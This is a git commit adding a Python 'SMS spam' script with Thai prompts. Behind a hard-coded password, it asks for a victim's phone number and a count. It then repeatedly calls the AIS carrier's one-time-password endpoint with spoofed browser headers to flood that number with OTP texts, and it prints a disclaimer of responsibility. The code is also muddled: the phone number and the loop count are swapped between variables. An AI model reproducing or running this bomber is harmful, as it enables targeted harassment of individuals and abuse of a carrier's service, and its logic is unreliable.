af1928fb48fcbf102def26f9465f376d40ab3517
gameming9999999 <80467030+gameming9999999@users.noreply.github.com>
2021-10-12 20:53:32 +0700

    Add files via upload

---
+++ nothing.py
@@ -0,0 +1,89 @@
+import requests,json,time,threading
+import requests,json,time,threading,os,sys
+import urllib.request, os, threading, time, random, sys
+import colorama
+from colorama import Fore, Style, init
+#from requests_futures.sessions import FuturesSession
+#from requests_futures import sessions
+import requests,json,time,threading
+print("\033[1;96m")
+password ="NothingYT"
+os.system("clear")
+print("\033[1;96m")
+os.system("figlet password")
+print("\033[1;92mX=====================================X")
+print ("                                      ")
+print ("\033[1;96mSCRIPT SPAM SMS                       ")
+print ("Like Password:\033[37;1m https://pastebin.com/raw/1an9x0jW      ")
+print ("                                      ")
+print("\033[1;92mX=====================================X")
+print("\033[1;96m")
+print("")
+print("    YouTube :\033[37;1m  Nothing YT")
+print("\033[1;96m")
+print("กด ctrl z เพื่อหยุด")
+print("ห้ามขาย")
+print ("")
+for i in range(99999):
+    pwd = input ("ใส่รหัสผ่าน : ")
+    l=99999
+    if(pwd==password):
+     print("ACCES GRANTED")
+     break
+    else:
+        print("\033[1;96mรหัสผ่านผิด\033[1;97m",i-l)
+os.system("clear")
+os.system("figlet S   P   A   M   S   M   S")
+print ("\t\033[37;1m")
+print("\033[1;92mFacebook\033[37;1m : \033[36;1mNaranan Leejaroen      ")
+print ("\033[1;92mYouTube\033[37;1m  : \033[36;1mNothing YT ")
+print ("")
+print("\033[37;1m                 ห้ามขาย 66 แทน 0")
+print ("              \033[1;96m \033[1;97m")
+print("")
+print(" ")
+session = requests.Session()
+print("#########################################")
+print ("\033[90m>\033[1;97m ตัวอย่าง: \033[1;92m+668293400997")
+number = input("\033[90m> \033[1;97mใส่เบอร์เหยื่อย:\033[1;96m+")
+delay = input("\033[90m> \033[1;97m delay time: \033[96m")
+print("\033[31;1mเกิดไรขึ้นไม่รับผิดชอบ ")
+num = int(input("\033[90m> \033[1;97mจำนวน: \033[1;97m"))
+print("#########################################")
+num = int("" + number)
+class SMS():
+    def spamais(self,num):
+        url = "https://srfng.ais.co.th/login/sendOneTimePW"
+        data = f"msisdn={num}&serviceId=AISPlay&accountType=all&otpChannel=sms"
+        headers = {
+                    "Host": "srfng.ais.co.th",
+                    "Connection": "keep-alive",
+                    "Content-Length": "67",
+                    "Accept": "*/*",
+                    "X-Requested-With": "XMLHttpRequest",
+                    "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; DUB-LX2 Build/HUAWEIDUB-LX2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.127 Mobile Safari/537.36",
+                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+                    "Origin": "h%252FKbELuWlQP0c4QZZH5QycFTQSe99dLLW%252B9p0RHRzywsQIn87FPH8L0gtszrXqKiFvtxE8Pqggd3uqKYFSMwfsPmq0F0uwkn6quCBVPvhQFfu5EmKs%252FEvhFra4YP8HKIEj4XzRJb3vZ7%252FTrr2WVX05gRU6z%252FlcARYAi5%252BQKjvB5FQJ0qDyB%252FW08dzfFbAEBNJ8bXjd%252FoSLcLEXWGHxDuLZdZoktrNPoR62cGNZXwESbtOn2dewHBJZ%252B9Gy7%252FkAjB6JzJDggYU1S%252FsN4s5AeCgGP73YEnl8HzPKGkNS41f7lGfAYlh3nem8GfS8MU7nuROY67%252FFhOvro3zsP5u8S8FyZNQxwJ%252FLVCFIA%252FQJvh%252Fqn%252BMQuY3FCG0UR0aj%252BFblDcoHHilrMOL80ARYMPPXNQPF2CrT9oSAflIke55nD%252FHFLl1oNawMNhw1xDCVg8kJLlzL019hJBkc7lBHzQOuVb1OclmjClna8yuPthki7cTgWLFUCOIUWD9RPRtolQL2oXPkwtiw3wl3OvkHfgoqCY3DZ4mNPuVn02F2%252B7fJeAJcPbHN4h3oqAnN3dv%252FebBFqMykm545pslib3M%252FI2DYESmolC484IfK0uXD5D0rC%252Fo5%252FO%252BMvAmKevq9L6vW8pFbvG%252B5q%252BBInKvYPJ%252BOxCyzMixWbOUnOW4axJtZp3grN474ew9v4UFkdU8VUGoXKVhldzaK9%252BxYuJBdY2Jfzqf%252FsVIYv3uE4RmGzzoeCrQ7QXZm0uH6t3j1yF63KOQX4QwOmpG526ym0Sh%252BXLWQFhxnbuquuA8N7cumFvTTi7oWHt4W8mJQ4IN1GvS0iHlBQHgvnEkjGRlCtB%252FJ07aNkfBWlLrwb1zgQI88OkOrtTDDUdsIUSVdy7r5pOILz6rcT8kC%252FGqneTshPK9RF4PHxrBSDIPlQIVXJI6dxsiAr5H3UfAAa5FsfN8samV5qyQTgm3s9SC4w83uM1twiFJtarImPcx41vDFL7NF4yy7Ej7eSY%252FFyqLQuoCKDPhxlyOaH8mRoseOkpdQI0Bp4z75t0NlP%252B4YIV4EKmRueIktZmOk5c0I1SLC3bZ240Wshg7rbP6IgtwFEzWrOoIAGpfWHDjYjI8oiMpQX98aBtbtZA9sKvIDrY%252FdQqDsP4vDSPy3n1zb8pXhqaKLkDaAWih%252Ba6BX3FkEdn4fPrzZrNPfuHRC3hfSV51Jz4t3RxTPUlOS8goU8VSmQF%252F9wQEaLAkVR3F4sGzn1GH1fesp46wBbSOSkWNCEIu%252F%252B1VTElnOqnPSntHsUmow7jMst3uCb7Z9mNj%252Bo4RQM0oEuf39FLtPgIWMfYBXSEQXOXUeO2%252BYXI9OUFORSQBJy1kZcTPw2gjR4ZYrkaWKgqCo5jtIclLeDiLqzdBKYjupRC3%252BFXgL0SDchuE%252BD3XaNJ1YH2SVg0UzxbOIg6aIBxcIhakpSZw2w0jjPL1c1YG%252BAgVvT%252BeNL%252FzHr%252FeiqQkFjNI%252F64fvurU75Qy53GSlOBBvQTMhg0q11qYi4QMaxf2V%252FQ1TY3QLnfXiYKCq60Gh9gSACyjrf8thXVYUYheRWz2jM%252BotOvz%252FZwIbXf4SPGR71PK7X%252F2a30w01XgOvYf9dxC%252F9pWn4yNxgl%252BPhoIXK%252Fj%252FQRofkDIdzr1VJ0%252Bq6aX66IuSuytQAwWsoB"
+        }
+        time.sleep(1)
+        send = session.post(url,data=data,headers=headers).json()
+        # if send.get("msg") == "msg":
+        #     pass
+        # else:
+        #     print(send.get("msg"))
+print ("")
+print ("please wait....")
+time.sleep(1)
+print ("")
+print ("\033[34;1m[\033[37;1m+\033[34;1m]\033[36;1m กำลังยิง AISPlay.../")
+print ("")
+print ("")
+time.sleep(1)
+t = SMS()
+def loop(num):
+    for i in range(num):
+        t.spamais(num)
+        print('\033[34;1m[\033[37;1mส่งไปแล้ว\033[34;1m] \033[34;1m[\033[37;1m1\033[34;1m] \033[36;1m '+ number )
+        
+loop(num)
+
